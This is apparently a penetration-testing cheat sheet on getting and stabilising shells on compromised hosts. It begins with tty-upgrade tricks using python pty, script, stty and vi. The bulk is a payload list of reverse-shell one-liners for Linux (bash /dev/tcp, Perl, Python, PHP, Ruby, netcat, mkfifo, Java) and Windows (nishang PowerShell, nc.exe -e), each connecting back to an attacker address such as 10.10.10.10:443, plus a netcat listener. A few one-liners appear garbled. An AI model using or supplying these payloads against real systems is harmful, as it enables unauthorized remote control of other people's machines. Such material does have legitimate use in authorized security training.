## Non-interactive tty-shell

If you have a non-tty-shell you're limited in your ability to operate. This can happen if you upload reverse shells to a webserver and get a shell such as www-data. These users are not meant to have shells as they don't interact with the system.

So if you don't have a tty-shell you can't run `su`, `sudo` for example. This can be annoying if you manage to get a root password but you can't use it.

If you get one of these shells you can upgrade it to a tty-shell using the following methods:

Stabilizing the shell:
```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice:
export TERM=xterm
```

**Using python**
```
# Python2
python -c 'import pty; pty.spawn("/bin/sh")'

# Python3
python3 -c "import pty; pty.spawn('/bin/sh')"
```

**Echo**
```
echo 'os.system('/bin/bash')'
```

**sh**
```
/bin/sh -i
```

**bash**
```
/bin/bash -i
```

**Perl**
```
perl -e 'exec "/bin/sh";'
```

**From within VI**
```
:!bash
```

## Interactive tty-shell

So if you manage to upgrade to a non-interactive tty-shell you will still have a limited shell. You won't be able to use the up and down arrows, you won't have tab-completion. This might be really frustrating if you stay in that shell for long. It can also be more risky, if a execution gets stuck you cant use Ctr-C or Ctr-Z without killing your session. However that can be fixed using socat. Follow these instructions.

[https://github.com/cornerpirate/socat-shell](https://github.com/cornerpirate/socat-shell)

# Listeners
```
# Netcat
[sudo] rlwrap nc -nvlp <port>
```

## Payloads
https://www.revshells.com/

### Linux
```bash
# bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1"

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i &3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",443).to_i;exec sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'

# Netcat : -u for UDP
nc [-u] 10.10.10.10 443 -e /bin/bash

# Netcat without -e : -u for UDP
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [-u] 10.10.10.10 443 > /tmp/f

# Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5/dev/tcp/10.10.10.10/443;cat &5 >&5; done"] as String[])
p.waitFor()
```
PHP reverse shell available [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) or locally `/usr/share/webshells/php/php-reverse-shell`

Python PTY shells available [here](https://github.com/infodox/python-pty-shells)
### Windows
PowerShell reverse shell available [here](https://github.com/samratashok/nishang) PHP reverse shell available [here](https://github.com/Dhayalanb/windows-php-reverse-shell) Netcat for Windows available [here](https://eternallybored.org/misc/netcat/)
```powershell
# PowerShell
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
vi shell.ps1
# go to end of file, paste the following
Invoke-PowerShellTcp -Reverse -IPAddress [attacker_ip] -Port [attacker_port]
# close, reverse shell ready to use

# Netcat - use x64 or x32 as per target. powershell.exe or cmd.exe
nc.exe x.x.x.x <port> -e powershell.exe
```